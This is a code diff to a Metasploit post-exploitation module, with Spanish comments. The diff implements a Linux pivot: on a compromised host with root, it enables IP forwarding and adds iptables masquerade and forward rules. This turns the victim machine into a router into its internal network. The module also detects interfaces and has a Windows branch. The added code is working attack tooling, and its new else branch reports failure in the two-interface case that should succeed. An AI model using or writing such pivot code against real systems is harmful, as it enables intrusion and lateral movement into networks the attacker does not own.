@@ -57,11 +57,23 @@ class MetasploitModule < Msf::Post
 		end
 	end
 
-	def linux_pivot()
+	def linux_pivot(intnic,outnic)
 		#
 		# Linux commands
 		#
-		
+		if is_admin?
+
+			cmd_exec("echo 1 > /proc/sys/net/ipv4/ip_forward")
+			cmd_exec("iptables -t nat -A POSTROUTING -o #{outnic} -j MASQUERADE")
+			cmd_exec("iptables -A FORWARD -i #{outnic} -o #{intnic} -m state --state RELATED,ESTABLISHED -j ACCEPT")
+			cmd_exec("iptables -A FORWARD -i #{intnic} -o #{outnic} -j ACCEPT")
+			print_good("All commands executed.")
+
+			#todo: hacer regla para reverse tcp,version 2
+		else
+			print_bad("Must be root to acomplish this module. Aborting...")
+		end
+
 	end
 	
 	#
@@ -408,11 +420,13 @@ class MetasploitModule < Msf::Post
 		system_ifaces = cmd_exec('ipconfig').gsub("\r","").split("\n")
 		adapter_name=[]
 		system_ifaces.each do |x|
+
 			if x.include? "Ethernet"
 				adapter_name=x.split(":").first
 			elsif (x.include? " IP" and x.include? ":") and not(x.include? "IPv6")#obtain ipv4 only
 				ip_iface = x.split(": ")
 				if_ip = ip_iface.last
+
 				if if_ip == ip
 					return adapter_name.gsub("\xA0","á").gsub("\xA2","ó")
 				end
@@ -451,8 +465,6 @@ class MetasploitModule < Msf::Post
 		final_hash[:rif_out]=rif_out
 		final_hash[:local_if]=local_if
 		return final_hash
-
-
 	end 
 
 	
@@ -471,21 +483,16 @@ class MetasploitModule < Msf::Post
 			print_bad("Only one interface detected. No operations to do. ")#pendiente invocar error para detener ejecucion
 		elsif total_ifaces > 2
 			print_bad("Too many interfaces detected. Set it manually. ")#pendiente invocar error para detener ejecucion
+		else	
+			print_bad("Something has broken, try it manually ")#pendiente invocar error para detener ejecucion
 		end
 
 		if check_rnet() and total_ifaces == 2
 			case session.platform
 			when 'linux'
-				print_status("comandos para linux")
+				print_status("Making Linux router...Please wait")
 				testar= rhost_data()#resultado en formato hash de la funcion que obtiene todos los datos del rhost
-				print_good("final hash ip rif:#{testar[:rif_in][:ip]} ")
-				print_good("final hash network rif:#{testar[:rif_in][:network]} ")
-				print_good("final hash netmask rif:#{testar[:rif_in][:netmask]} ")
-				print_good("final hash nombre nic rif:#{testar[:rif_in][:name]} ")
-				print_good("final hash ip rifout:#{testar[:rif_out][:ip]} ")
-				print_good("final hash network rifout:#{testar[:rif_out][:network]} ")
-				print_good("final hash netmask rifout:#{testar[:rif_out][:netmask]} ")
-				print_good("final hash nombre nic:#{testar[:rif_out][:name]} ")
+				linux_pivot(testar[:rif_in][:name],testar[:rif_out][:name])#parametros nombre nic entrada, nombre nic salida
 			when 'windows'
 				print_status("comandos para windows")
 				testar= rhost_data()#resultado en formato hash de la funcion que obtiene todos los datos del rhost
